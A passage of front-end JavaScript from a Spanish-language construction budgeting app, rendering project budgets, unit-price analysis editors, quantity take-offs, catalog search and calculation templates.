        ? renderApuRubro({ id: 0, name: 'Partidas sin rubro', code: '', total: unassigned.reduce((a, i) => a + Number(i.total_price || 0), 0), items: unassigned }, rubros.length, cur)
        : '';

    const itemCount = rubros.reduce((a, r) => a + (r.items || []).length, 0) + unassigned.length;

    page.innerHTML = `
        <div class="apu-back">
            <button class="btn btn-secondary btn-sm" onclick="renderApuProjects()">&larr; Proyectos</button>
        </div>

        <div class="apu-proj-hero">
            <div class="apu-proj-hero-main">
                <div class="apu-proj-hero-top">
                    ${p.code ? `<span class="apu-proj-code">${esc(p.code)}</span>` : ''}
                    <span class="badge ${st.cls}">${esc(st.label)}</span>
                </div>
                <h1 class="apu-proj-hero-title">${esc(p.name)}</h1>
                <div class="apu-proj-hero-meta">
                    ${p.client_name ? `<span>${icon('building', 14)} ${esc(p.client_name)}</span>` : ''}
                    ${p.location ? `<span>${icon('map-pin', 14)} ${esc(p.location)}</span>` : ''}
                    ${p.region ? `<span>${icon('globe', 14)} ${esc(p.region)}</span>` : ''}
                    <span>${icon('layers', 14)} ${esc(String(itemCount))} partidas</span>
                    ${p.created_at ? `<span>${icon('clock', 14)} ${esc(_apuDate(p.created_at))}</span>` : ''}
                </div>
                <div class="apu-proj-hero-actions">
                    <button class="btn btn-secondary btn-sm" onclick="apuRecompute(${Number(p.id)})">
                        ${icon('refresh-cw', 15)} Recalcular
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="apuRefreshPrices(${Number(p.id)})">
                        ${icon('trending-up', 15)} Actualizar precios de mercado
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="openApuTemplates(${Number(p.id)})">
                        ${icon('sliders', 15)} Plantillas de calculo
                    </button>
                </div>
            </div>
            <div class="apu-proj-hero-total">
                <span class="apu-proj-hero-total-lbl">Total del presupuesto</span>
                <span class="apu-proj-hero-total-val">${esc(_apuMoney(p.total_budget, cur))}</span>
                <span class="apu-proj-hero-total-cur">${esc(String(cur).toUpperCase())}</span>
            </div>
        </div>

        <div class="apu-tree">
            ${rubroBlocks || ''}
            ${looseBlock}
            ${(!rubroBlocks && !looseBlock) ? `
                <div class="apu-empty">
                    <div class="apu-empty-ico">${icon('layers', 40)}</div>
                    <h3>El presupuesto esta vacio</h3>
                    <p>Este proyecto todavia no tiene rubros ni partidas cargadas.</p>
                </div>` : ''}
        </div>

        ${(rubroBlocks || looseBlock) ? `
        <div class="apu-grand-total">
            <span class="apu-grand-total-lbl">Total general del presupuesto</span>
            <span class="apu-grand-total-val">${esc(_apuMoney(p.total_budget, cur))}</span>
        </div>` : ''}
    `;
}

function renderApuRubro(r, idx, cur) {
    const rid = Number(r.id) || 0;
    const closed = !!_apu.closedRubros[rid];
    const items = r.items || [];
    const rows = items.map(it => `
        <tr class="apu-item-row" onclick="openApuItem(${Number(it.id)})">
            <td class="apu-cell-code">${esc(it.code || '')}</td>
            <td class="apu-cell-name">
                ${esc(it.name)}
                <span class="apu-cell-go">${icon('chevron-right', 14)}</span>
            </td>
            <td class="apu-cell-uom">${esc(it.uom || '')}</td>
            <td class="apu-cell-num">${esc(_apuNum(it.quantity, 2))}</td>
            <td class="apu-cell-num">${esc(_apuNum(it.unit_price, 2))}</td>
            <td class="apu-cell-num apu-cell-strong">${esc(_apuNum(it.total_price, 2))}</td>
        </tr>
    `).join('');

    return `
        <section class="apu-rubro${closed ? ' closed' : ''}" id="apu-rubro-${rid}">
            <header class="apu-rubro-head" onclick="toggleApuRubro(${rid})">
                <span class="apu-rubro-chev">${icon('chevron-down', 16)}</span>
                <span class="apu-rubro-idx">${esc(String(r.code || (idx + 1)))}</span>
                <span class="apu-rubro-name">${esc(r.name)}</span>
                <span class="apu-rubro-count">${esc(String(items.length))} partidas</span>
                <span class="apu-rubro-total">${esc(_apuMoney(r.total, cur))}</span>
            </header>
            <div class="apu-rubro-body">
                ${items.length ? `
                <div class="table-wrap">
                    <table class="apu-table">
                        <thead>
                            <tr>
                                <th style="width:110px">Codigo</th>
                                <th>Descripcion</th>
                                <th style="width:70px">Unidad</th>
                                <th style="width:110px" class="apu-th-num">Cantidad</th>
                                <th style="width:130px" class="apu-th-num">P. unitario</th>
                                <th style="width:140px" class="apu-th-num">Total</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>` : '<div class="apu-rubro-empty">Sin partidas en este rubro</div>'}
            </div>
        </section>
    `;
}

function toggleApuRubro(rubroId) {
    const rid = Number(rubroId) || 0;
    _apu.closedRubros[rid] = !_apu.closedRubros[rid];
    const el = document.getElementById('apu-rubro-' + rid);
    if (el) el.classList.toggle('closed', !!_apu.closedRubros[rid]);
}

async function apuRecompute(projectId) {
    toast('Recalculando presupuesto...', 'info');
    try {
        const resp = await API.apuRecomputeProject(projectId);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo recalcular'), 'error'); return; }
        const d = resp.data || {};
        const cycles = (d.cycles || []).length;
        toast(`Recalculado: ${d.items_computed || 0} partidas${cycles ? ` — ${cycles} referencias circulares detectadas` : ''}`,
              cycles ? 'error' : 'success');
        openApuProject(projectId);
    } catch { toast('Error de conexion', 'error'); }
}

async function apuRefreshPrices(projectId, includeManual = false) {
    const aviso = includeManual
        ? 'Esto tambien reemplazara los precios que cargaste a mano. Continuar?'
        : 'Actualizar los precios de los insumos con los ultimos precios de mercado?';
    if (!confirm(aviso)) return;
    toast('Consultando precios de mercado...', 'info');
    try {
        const resp = await API.apuRefreshProjectPrices(projectId, includeManual);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudieron actualizar los precios'), 'error'); return; }
        const d = resp.data || {};
        showModal('Precios de mercado actualizados', `
            <div class="apu-refresh-grid">
                <div class="apu-refresh-cell"><span class="apu-refresh-num">${esc(String(d.updated || 0))}</span><span class="apu-refresh-lbl">Actualizados</span></div>
                <div class="apu-refresh-cell"><span class="apu-refresh-num">${esc(String(d.unchanged || 0))}</span><span class="apu-refresh-lbl">Sin cambios</span></div>
                <div class="apu-refresh-cell"><span class="apu-refresh-num">${esc(String(d.not_found || 0))}</span><span class="apu-refresh-lbl">Sin precio</span></div>
                <div class="apu-refresh-cell"><span class="apu-refresh-num">${esc(String(d.kept_manual || 0))}</span><span class="apu-refresh-lbl">Negociados (intactos)</span></div>
            </div>
            <p class="apu-hint" style="margin-top:12px">Los totales del presupuesto ya fueron recalculados con los nuevos precios.</p>
            ${(d.kept_manual || 0) > 0 ? `<p class="apu-hint">Se respetaron ${esc(String(d.kept_manual))} precio(s) que cargaste a mano. Si querés alinearlos también al mercado, usá "Forzar todos".</p>
            <div style="text-align:left;margin-top:8px"><button class="btn btn-secondary btn-sm" onclick="apuRefreshPrices(${Number(projectId)}, true)">Forzar todos</button></div>` : ''}
            <div style="text-align:right;margin-top:16px">
                <button class="btn btn-primary" onclick="closeModal()">Cerrar</button>
            </div>
        `);
        openApuProject(projectId);
    } catch { toast('Error de conexion', 'error'); }
}

// ── Pantalla 3: editor de APU (composicion de la partida) ─────
async function openApuItem(itemId, keepScroll) {
    const page = document.getElementById('page-content');
    if (!page) return;
    const scrollY = keepScroll ? window.scrollY : 0;
    _apu.view = 'item';
    _apu.itemId = itemId;
    if (!keepScroll) page.innerHTML = '<div class="empty-state"><p>Cargando analisis de precios...</p></div>';
    try {
        const resp = await API.apuItem(itemId);
        if (!resp.ok) {
            page.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar la partida'))}</p></div>`;
            return;
        }
        _apu.item = resp.data;
        renderApuItemEditor(resp.data);
        if (keepScroll) window.scrollTo(0, scrollY);
    } catch {
        page.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderApuItemEditor(it) {
    const page = document.getElementById('page-content');
    if (!page) return;
    const cur = (_apu.project && _apu.project.currency) || it.currency || 'BOB';
    const lines = it.lines || [];

    const grouped = {};
    APU_BLOCKS.forEach(b => { grouped[b.key] = []; });
    lines.forEach(l => { grouped[_apuBlockOf(l.type).key].push(l); });

    const fallbackCost = { material: it.mat_cost, labor: it.mo_cost, equipment: it.eq_cost };
    const blocksHtml = APU_BLOCKS.map(b => renderApuBlock(b, grouped[b.key], cur, fallbackCost[b.key])).join('');

    const directCost = it.direct_cost != null
        ? it.direct_cost
        : (Number(it.mat_cost || 0) + Number(it.mo_cost || 0) + Number(it.eq_cost || 0));

    const backBtn = _apu.projectId
        ? `<button class="btn btn-secondary btn-sm" onclick="openApuProject(${Number(_apu.projectId)})">&larr; Volver al presupuesto</button>`
        : `<button class="btn btn-secondary btn-sm" onclick="renderApuProjects()">&larr; Proyectos</button>`;

    page.innerHTML = `
        <div class="apu-back">${backBtn}</div>

        <div class="apu-item-hero">
            <div class="apu-item-hero-main">
                <div class="apu-item-hero-top">
                    ${it.code ? `<span class="apu-proj-code">${esc(it.code)}</span>` : ''}
                    <span class="badge badge-primary">Analisis de precio unitario</span>
                </div>
                <h1 class="apu-item-hero-title">${esc(it.name)}</h1>
                <div class="apu-item-hero-meta">
                    <span>Unidad: <strong>${esc(it.uom || '—')}</strong></span>
                    <span>Cantidad: <strong>${esc(_apuNum(it.quantity, 2))}</strong></span>
                    <span>Total partida: <strong>${esc(_apuMoney(it.total_price, cur))}</strong></span>
                </div>
            </div>
            <div class="apu-item-hero-price">
                <span class="apu-item-hero-price-lbl">Precio unitario</span>
                <span class="apu-item-hero-price-val">${esc(_apuNum(it.unit_price, 2))}</span>
                <span class="apu-item-hero-price-cur">${esc(_apuCurSymbol(cur))} / ${esc(it.uom || 'und')}</span>
            </div>
        </div>

        <div class="apu-cost-strip">
            <div class="apu-cost-chip mat"><span>Materiales</span><strong>${esc(_apuNum(it.mat_cost, 2))}</strong></div>
            <div class="apu-cost-chip mo"><span>Mano de obra</span><strong>${esc(_apuNum(it.mo_cost, 2))}</strong></div>
            <div class="apu-cost-chip eq"><span>Equipo</span><strong>${esc(_apuNum(it.eq_cost, 2))}</strong></div>
            <div class="apu-cost-chip total"><span>Costo directo</span><strong>${esc(_apuNum(directCost, 2))}</strong></div>
        </div>

        <div class="apu-editor">
            <div class="apu-editor-left">
                ${blocksHtml}
                ${renderApuComputos(it)}
            </div>
            <div class="apu-editor-right">
                ${renderApuSummary(it, cur)}
            </div>
        </div>
    `;
}

function renderApuBlock(b, lines, cur, fallbackCost) {
    const closed = !!_apu.closedBlocks[b.key];
    const subtotal = lines.length
        ? lines.reduce((a, l) => a + Number(l.price_subtotal != null ? l.price_subtotal : (Number(l.quantity || 0) * Number(l.price_unit || 0))), 0)
        : Number(fallbackCost || 0);

    const rows = lines.map(l => {
        const lid = Number(l.id);
        const sub = l.price_subtotal != null ? l.price_subtotal : (Number(l.quantity || 0) * Number(l.price_unit || 0));
        const src = l.insumo_id
            ? `<span class="apu-src apu-src-mkt" title="Vinculado al catalogo de mercado">${icon('tag', 11)} ${esc(l.price_source || 'mercado')}</span>`
            : `<span class="apu-src">${esc(l.price_source || 'manual')}</span>`;
        return `
            <div class="apu-line" id="apu-line-${lid}">
                <div class="apu-line-desc">
                    <span class="apu-line-name">${esc(l.name)}</span>
                    ${src}
                </div>
                <div class="apu-line-uom">${esc(l.uom || '')}</div>
                <div class="apu-line-inp apu-line-qty">
                    <input class="apu-inp" type="number" step="0.001" min="0"
                           value="${esc(Number(l.quantity || 0).toFixed(3))}"
                           aria-label="Rendimiento"
                           onchange="apuLineEdit(${lid}, 'quantity', this.value)">
                </div>
                <div class="apu-line-inp apu-line-price">
                    <input class="apu-inp" type="number" step="0.01" min="0"
                           value="${esc(Number(l.price_unit || 0).toFixed(2))}"
                           aria-label="Precio unitario"
                           onchange="apuLineEdit(${lid}, 'price_unit', this.value)">
                </div>
                <div class="apu-line-sub">${esc(_apuNum(sub, 2))}</div>
                <button class="apu-line-del" title="Quitar recurso" onclick="apuDeleteLine(${lid})">${icon('trash', 14)}</button>
            </div>
        `;
    }).join('');

    return `
        <section class="apu-block apu-block-${b.cls}${closed ? ' closed' : ''}" id="apu-block-${esc(b.key)}">
            <header class="apu-block-head" onclick="toggleApuBlock('${escJs(b.key)}')">
                <span class="apu-block-chev">${icon('chevron-down', 16)}</span>
                <span class="apu-block-ico">${icon(b.ico, 16)}</span>
                <span class="apu-block-title">${esc(b.label)}</span>
                <span class="apu-block-count">${esc(String(lines.length))}</span>
                <span class="apu-block-sub">${esc(_apuNum(subtotal, 2))}</span>
            </header>
            <div class="apu-block-body">
                <div class="apu-line apu-line-head">
                    <div class="apu-line-desc">Descripcion</div>
                    <div class="apu-line-uom">Unidad</div>
                    <div class="apu-line-inp apu-line-qty">Rendim.</div>
                    <div class="apu-line-inp apu-line-price">P. unit.</div>
                    <div class="apu-line-sub">Subtotal</div>
                    <div class="apu-line-del-h"></div>
                </div>
                ${rows || '<div class="apu-block-empty">Sin recursos cargados en este bloque</div>'}
                <div class="apu-block-foot">
                    <button class="btn btn-sm btn-secondary" onclick="showApuAddLineModal('${escJs(b.key)}')">
                        ${icon('plus', 14)} Agregar recurso
                    </button>
                    <span class="apu-block-foot-total">Subtotal ${esc(b.label.toLowerCase())}: <strong>${esc(_apuMoney(subtotal, cur))}</strong></span>
                </div>
            </div>
        </section>
    `;
}

function toggleApuBlock(key) {
    _apu.closedBlocks[key] = !_apu.closedBlocks[key];
    const el = document.getElementById('apu-block-' + key);
    if (el) el.classList.toggle('closed', !!_apu.closedBlocks[key]);
}

function renderApuSummary(it, cur) {
    const rows = (it.summary || []).map(s => `
        <tr class="${s.is_total ? 'apu-sum-total' : ''}">
            <td class="apu-sum-code">${esc(s.code || '')}</td>
            <td>
                ${esc(s.name)}
                ${s.value_formula ? `<span class="apu-sum-formula">${esc(s.value_formula)}</span>` : ''}
            </td>
            <td class="apu-cell-num apu-cell-strong">${esc(_apuNum(s.amount, 2))}</td>
        </tr>
    `).join('');

    return `
        <section class="apu-summary">
            <header class="apu-summary-head">
                ${icon('file-text', 16)}
                <span>Planilla de resultado</span>
            </header>
            ${rows ? `
            <div class="table-wrap">
                <table class="apu-table apu-table-sum">
                    <thead>
                        <tr>
                            <th style="width:48px">#</th>
                            <th>Concepto</th>
                            <th style="width:120px" class="apu-th-num">Monto</th>
                        </tr>
                    </thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>` : '<div class="apu-block-empty">La plantilla de recargos no devolvio filas</div>'}
            <div class="apu-final">
                <span class="apu-final-lbl">Precio unitario final</span>
                <span class="apu-final-val">${esc(_apuMoney(it.unit_price, cur))}</span>
                <span class="apu-final-uom">por ${esc(it.uom || 'unidad')}</span>
            </div>
        </section>
    `;
}

// ── Computos metricos ─────────────────────────────────────────
function renderApuComputos(it) {
    const comps = it.computos || [];
    const total = comps.reduce((a, c) => a + Number(c.subtotal != null ? c.subtotal : 0), 0);

    const rows = comps.map(c => {
        const cid = Number(c.id);
        return `
            <tr id="apu-comp-${cid}">
                <td>
                    <input class="apu-inp apu-inp-text" type="text" value="${esc(c.name || '')}"
                           aria-label="Descripcion"
                           onchange="apuComputoEdit(${cid}, 'name', this.value)">
                </td>
                <td><input class="apu-inp" type="number" step="1" min="0" value="${esc(Number(c.pieces || 0).toFixed(0))}"
                           aria-label="Piezas" onchange="apuComputoEdit(${cid}, 'pieces', this.value)"></td>
                <td><input class="apu-inp" type="number" step="0.001" min="0" value="${esc(Number(c.length || 0).toFixed(3))}"
                           aria-label="Largo" onchange="apuComputoEdit(${cid}, 'length', this.value)"></td>
                <td><input class="apu-inp" type="number" step="0.001" min="0" value="${esc(Number(c.width || 0).toFixed(3))}"
                           aria-label="Ancho" onchange="apuComputoEdit(${cid}, 'width', this.value)"></td>
                <td><input class="apu-inp" type="number" step="0.001" min="0" value="${esc(Number(c.height || 0).toFixed(3))}"
                           aria-label="Alto" onchange="apuComputoEdit(${cid}, 'height', this.value)"></td>
                <td class="apu-cell-num apu-cell-strong">${esc(_apuNum(c.subtotal, 3))}</td>
                <td class="apu-cell-act">
                    <button class="apu-line-del" title="Eliminar fila" onclick="apuDeleteComputo(${cid})">${icon('trash', 14)}</button>
                </td>
            </tr>
        `;
    }).join('');

    return `
        <section class="apu-comp">
            <header class="apu-comp-head">
                ${icon('ruler', 16)}
                <span>Computos metricos</span>
                <span class="apu-comp-hint">El total alimenta la cantidad de la partida</span>
            </header>
            <div class="table-wrap">
                <table class="apu-table apu-table-comp">
                    <thead>
                        <tr>
                            <th>Elemento</th>
                            <th style="width:80px" class="apu-th-num">Piezas</th>
                            <th style="width:100px" class="apu-th-num">Largo</th>
                            <th style="width:100px" class="apu-th-num">Ancho</th>
                            <th style="width:100px" class="apu-th-num">Alto</th>
                            <th style="width:110px" class="apu-th-num">Subtotal</th>
                            <th style="width:44px"></th>
                        </tr>
                    </thead>
                    <tbody>
                        ${rows || '<tr><td colspan="7" class="apu-block-empty">Sin filas de computo</td></tr>'}
                        <tr class="apu-comp-new">
                            <td><input class="apu-inp apu-inp-text" id="apu-comp-name" type="text" placeholder="Ej. Muro eje A" maxlength="120"></td>
                            <td><input class="apu-inp" id="apu-comp-pieces" type="number" step="1" min="0" placeholder="1"></td>
                            <td><input class="apu-inp" id="apu-comp-length" type="number" step="0.001" min="0" placeholder="0.000"></td>
                            <td><input class="apu-inp" id="apu-comp-width" type="number" step="0.001" min="0" placeholder="0.000"></td>
                            <td><input class="apu-inp" id="apu-comp-height" type="number" step="0.001" min="0" placeholder="0.000"></td>
                            <td colspan="2">
                                <button class="btn btn-sm btn-primary" onclick="apuAddComputoRow()">${icon('plus', 14)} Agregar</button>
                            </td>
                        </tr>
                    </tbody>
                    <tfoot>
                        <tr>
                            <td colspan="5" class="apu-comp-total-lbl">Total computado</td>
                            <td class="apu-cell-num apu-comp-total-val">${esc(_apuNum(total, 3))}</td>
                            <td></td>
                        </tr>
                    </tfoot>
                </table>
            </div>
        </section>
    `;
}

async function apuAddComputoRow() {
    if (!_apu.itemId) return;
    const g = (id) => document.getElementById(id);
    const name = (g('apu-comp-name')?.value || '').trim();
    const payload = {
        name: name || 'Elemento',
        pieces: parseFloat(g('apu-comp-pieces')?.value) || 0,
        length: parseFloat(g('apu-comp-length')?.value) || 0,
        width: parseFloat(g('apu-comp-width')?.value) || 0,
        height: parseFloat(g('apu-comp-height')?.value) || 0,
    };
    if (!payload.pieces && !payload.length) {
        toast('Indica al menos piezas y una dimension', 'error');
        return;
    }
    try {
        const resp = await API.apuAddComputo(_apu.itemId, payload);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo agregar la fila'), 'error'); return; }
        toast('Fila de computo agregada', 'success');
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

async function apuComputoEdit(computoId, field, value) {
    const payload = {};
    payload[field] = field === 'name' ? String(value).trim() : (parseFloat(value) || 0);
    try {
        const resp = await API.apuUpdateComputo(computoId, payload);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo actualizar'), 'error'); return; }
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

async function apuDeleteComputo(computoId) {
    if (!confirm('Eliminar esta fila de computo?')) return;
    try {
        const resp = await API.apuDeleteComputo(computoId);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo eliminar'), 'error'); return; }
        toast('Fila eliminada', 'success');
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

// ── Lineas de composicion: alta, edicion, baja ────────────────
async function apuLineEdit(lineId, field, value) {
    const payload = {};
    payload[field] = parseFloat(value) || 0;
    try {
        const resp = await API.apuUpdateLine(lineId, payload);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo actualizar la linea'), 'error'); return; }
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

async function apuDeleteLine(lineId) {
    if (!confirm('Quitar este recurso del analisis?')) return;
    try {
        const resp = await API.apuDeleteLine(lineId);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo eliminar'), 'error'); return; }
        toast('Recurso eliminado', 'success');
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

function showApuAddLineModal(blockKey) {
    const b = APU_BLOCKS.find(x => x.key === blockKey) || APU_BLOCKS[0];
    _apu.pick = null;
    const uoms = UOM_LIST.length
        ? UOM_LIST.map(u => `<option value="${esc(u.key)}">${esc(u.key)} - ${esc(u.label)}</option>`).join('')
        : '';
    showModal('Agregar recurso — ' + b.label, `
        <form onsubmit="handleApuAddLine(event, '${escJs(b.key)}')">
            <div class="form-group">
                <label class="form-label">Buscar en el catalogo de mercado</label>
                <div class="apu-search-wrap">
                    <input class="form-input" id="apu-cat-q" autocomplete="off"
                           placeholder="Ej. cemento portland, albanil, mezcladora..."
                           oninput="debounceApuCatalogSearch()">
                    <div id="apu-cat-results" class="apu-sug" style="display:none"></div>
                </div>
                <span class="apu-hint">Elige un insumo para traer su unidad y precio actual, o carga el recurso a mano abajo.</span>
            </div>
            <div id="apu-pick-banner"></div>
            <div class="form-group">
                <label class="form-label">Descripcion *</label>
                <input class="form-input" name="name" id="apu-line-name" required maxlength="200" placeholder="Descripcion del recurso">
            </div>
            <div class="apu-form-3">
                <div class="form-group">
                    <label class="form-label">Unidad *</label>
                    <input class="form-input" name="uom" id="apu-line-uom" required maxlength="20" list="apu-uom-list" placeholder="m3, kg, hr...">
                    <datalist id="apu-uom-list">${uoms}</datalist>
                </div>
                <div class="form-group">
                    <label class="form-label">Rendimiento *</label>
                    <input class="form-input" name="quantity" id="apu-line-qty" type="number" step="0.001" min="0" required value="1.000">
                </div>
                <div class="form-group">
                    <label class="form-label">Precio unitario *</label>
                    <input class="form-input" name="price_unit" id="apu-line-price" type="number" step="0.01" min="0" required value="0.00">
                </div>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Agregar al analisis</button>
            </div>
        </form>
    `);
}

let _apuCatalogTimer = null;
function debounceApuCatalogSearch() {
    clearTimeout(_apuCatalogTimer);
    _apuCatalogTimer = setTimeout(apuCatalogSearch, 250);
}

async function apuCatalogSearch() {
    const input = document.getElementById('apu-cat-q');
    const box = document.getElementById('apu-cat-results');
    if (!input || !box) return;
    const q = input.value.trim();
    if (q.length < 2) { box.style.display = 'none'; box.innerHTML = ''; return; }
    try {
        // smart-search: embeddings + fallback trigram (misma fuente que el buscador publico)
        const resp = await API.smartSearch(q, null, 8);
        const base = (resp && resp.ok) ? [...(resp.data || []), ...(resp.suggestions || [])] : [];
        const seen = new Set();
        const items = base.filter(p => p.id && !seen.has(p.id) && (seen.add(p.id), true)).slice(0, 8);
        if (!items.length) {
            box.innerHTML = '<div class="apu-sug-empty">Sin resultados en el catalogo</div>';
            box.style.display = '';
            return;
        }
        box.innerHTML = items.map(p => `
            <div class="apu-sug-item" onclick="apuPickCatalogItem(${Number(p.id)}, '${escJs(p.name)}', '${escJs(p.uom || '')}', ${Number(p.ref_price) || 0})">
                <div>
                    <div class="apu-sug-name">${esc(p.name)}</div>
                    <div class="apu-sug-meta">${p.category ? esc(p.category) : ''}${p.uom ? ' &middot; ' + esc(p.uom) : ''}</div>
                </div>
                <span class="apu-sug-price">${p.ref_price ? esc(_apuNum(p.ref_price, 2)) : '—'}</span>
            </div>
        `).join('');
        box.style.display = '';
    } catch {
        box.style.display = 'none';
    }
}

function apuPickCatalogItem(insumoId, name, uom, price) {
    _apu.pick = { id: insumoId, name, uom, price };
    const box = document.getElementById('apu-cat-results');
    if (box) { box.style.display = 'none'; box.innerHTML = ''; }
    const q = document.getElementById('apu-cat-q');
    if (q) q.value = '';
    const nameEl = document.getElementById('apu-line-name');
    const uomEl = document.getElementById('apu-line-uom');
    const priceEl = document.getElementById('apu-line-price');
    if (nameEl) nameEl.value = name;
    if (uomEl && uom) uomEl.value = uom;
    if (priceEl) priceEl.value = (Number(price) || 0).toFixed(2);
    const banner = document.getElementById('apu-pick-banner');
    if (banner) {
        banner.innerHTML = `
            <div class="apu-pick">
                ${icon('tag', 14)}
                <span>Vinculado al catalogo: <strong>${esc(name)}</strong></span>
                <button type="button" class="apu-pick-x" onclick="apuClearCatalogPick()" title="Desvincular">&times;</button>
            </div>
        `;
    }
}

function apuClearCatalogPick() {
    _apu.pick = null;
    const banner = document.getElementById('apu-pick-banner');
    if (banner) banner.innerHTML = '';
}

async function handleApuAddLine(e, blockKey) {
    e.preventDefault();
    if (!_apu.itemId) return;
    const f = e.target;
    const payload = {
        type: _apuApiType(blockKey),
        insumo_id: _apu.pick ? _apu.pick.id : null,
        name: f.name.value.trim(),
        uom: f.uom.value.trim(),
        quantity: parseFloat(f.quantity.value) || 0,
        price_unit: parseFloat(f.price_unit.value) || 0,
    };
    try {
        const resp = await API.apuAddLine(_apu.itemId, payload);
        if (!resp.ok) { toast(_apuDetail(resp, 'No se pudo agregar el recurso'), 'error'); return; }
        _apu.pick = null;
        closeModal();
        toast('Recurso agregado', 'success');
        openApuItem(_apu.itemId, true);
    } catch { toast('Error de conexion', 'error'); }
}

// Cerrar sugerencias del catalogo al hacer clic fuera
document.addEventListener('click', (e) => {
    const box = document.getElementById('apu-cat-results');
    if (box && !e.target.closest('.apu-search-wrap')) box.style.display = 'none';
});

// ═══════════════════════════════════════════════════════════════
// ── APU — Plantillas de calculo (recargos y precio final) ──────
// ═══════════════════════════════════════════════════════════════

// Tipos de fila que entiende el motor de calculo del backend.
const APU_TPL_LINE_TYPES = [
    { key: 'sum_mat', label: 'Suma materiales',   hint: 'Suma el costo de todos los materiales de la partida' },
    { key: 'sum_mo',  label: 'Suma mano de obra', hint: 'Suma el costo de mano de obra de la partida' },
    { key: 'sum_eq',  label: 'Suma equipo',       hint: 'Suma el costo de equipo y herramientas' },
    { key: 'percent', label: 'Porcentaje',        hint: 'Aplica un % sobre la fila indicada en la formula' },
    { key: 'formula', label: 'Formula',           hint: 'Expresion libre con los codigos de otras filas. Ej: A + B * 0.15' },
];

const APU_TPL_SCOPES = [
    { key: 'global',  label: 'Plantillas globales', desc: 'Definidas por el sistema. Se pueden usar tal cual o clonar para editarlas.' },
    { key: 'company', label: 'De mi empresa',       desc: 'Disponibles para todos los proyectos de tu empresa.' },
    { key: 'project', label: 'De esta obra',        desc: 'Solo se aplican al proyecto actual.' },
];

const _apuTpl = {
    projectId: null,
    list: [],
    editing: null,   // copia local de la plantilla; el servidor manda al guardar
    errors: [],      // mensajes de validacion devueltos por el backend
};

/** Alcance de la plantilla, normalizado a global/company/project. */
function _apuTplScope(t) {
    if (t.is_global || t.scope === 'global') return 'global';
    if (t.scope === 'project' || t.project_id) return 'project';
    return 'company';
}

/** Las globales llegan bloqueadas: el backend responde 403 si se editan. */
function _apuTplEditable(t) {
    if (t.is_global) return false;
    return t.editable !== false;
}

function _apuTplTypeLabel(type) {
    const t = APU_TPL_LINE_TYPES.find(x => x.key === type);
    return t ? t.label : String(type || '');
}

// El 422 de FastAPI puede venir como string, lista de strings o lista de
// objetos {loc, msg}. Se normaliza a una lista de mensajes legibles.
function _apuDetailList(data) {
    const d = data && (data.detail !== undefined && data.detail !== null ? data.detail : data.error);
    if (d === undefined || d === null || d === '') return [];
    if (typeof d === 'string') return [d];
    if (Array.isArray(d)) {
        return d.map(x => {
            if (typeof x === 'string') return x;
            if (x && typeof x === 'object') return x.msg || x.message || x.detail || JSON.stringify(x);
            return String(x);
        });
    }
    if (typeof d === 'object') return [d.msg || d.message || d.detail || JSON.stringify(d)];
    return [String(d)];
}

// ── Lista de plantillas ───────────────────────────────────────
async function openApuTemplates(projectId) {
    const page = document.getElementById('page-content');
    if (!page) return;
    _apuTpl.projectId = projectId ? Number(projectId) : null;
    _apuTpl.editing = null;
    _apuTpl.errors = [];
    page.innerHTML = '<div class="empty-state"><p>Cargando plantillas...</p></div>';
    loadApuTemplates();
}

async function loadApuTemplates() {
    const page = document.getElementById('page-content');
    if (!page) return;
    try {
        const resp = await API.apuTemplates(_apuTpl.projectId);
        if (!resp.ok) {
            page.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudieron cargar las plantillas'))}</p></div>`;
            return;
        }
        _apuTpl.list = resp.data || [];
        renderApuTemplatesList();
    } catch {
        page.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderApuTemplatesList() {
    const page = document.getElementById('page-content');
    if (!page) return;

    const backBtn = _apuTpl.projectId
        ? `<button class="btn btn-secondary btn-sm" onclick="openApuProject(${Number(_apuTpl.projectId)})">&larr; Volver al presupuesto</button>`
        : `<button class="btn btn-secondary btn-sm" onclick="renderApuProjects()">&larr; Proyectos</button>`;

    const groups = APU_TPL_SCOPES.map(sc => {
        const items = _apuTpl.list.filter(t => _apuTplScope(t) === sc.key);
        if (sc.key === 'project' && !_apuTpl.projectId && !items.length) return '';
        return `
            <section class="tpl-group">
                <header class="tpl-group-head">
                    <span class="tpl-group-title">${esc(sc.label)}</span>
                    <span class="tpl-group-count">${esc(String(items.length))}</span>
                </header>
                <p class="apu-hint">${esc(sc.desc)}</p>
                ${items.length
                    ? `<div class="tpl-grid">${items.map(renderApuTemplateCard).join('')}</div>`
                    : '<div class="tpl-empty">Sin plantillas en este alcance</div>'}
            </section>
        `;
    }).join('');

    page.innerHTML = `
        <div class="apu-back">${backBtn}</div>
        <div class="page-header apu-header">
            <div>
                <h1 class="page-title">Plantillas de calculo</h1>
                <p class="page-subtitle">Cargas sociales, gastos generales, utilidad e impuestos: definen como se llega al precio unitario final</p>
            </div>
            <div class="apu-header-actions">
                <button class="btn btn-primary" onclick="showApuNewTemplateModal()">
                    ${icon('plus', 16)} Nueva plantilla
                </button>
            </div>
        </div>
        <div class="tpl-groups">${groups}</div>
    `;
}

function renderApuTemplateCard(t) {
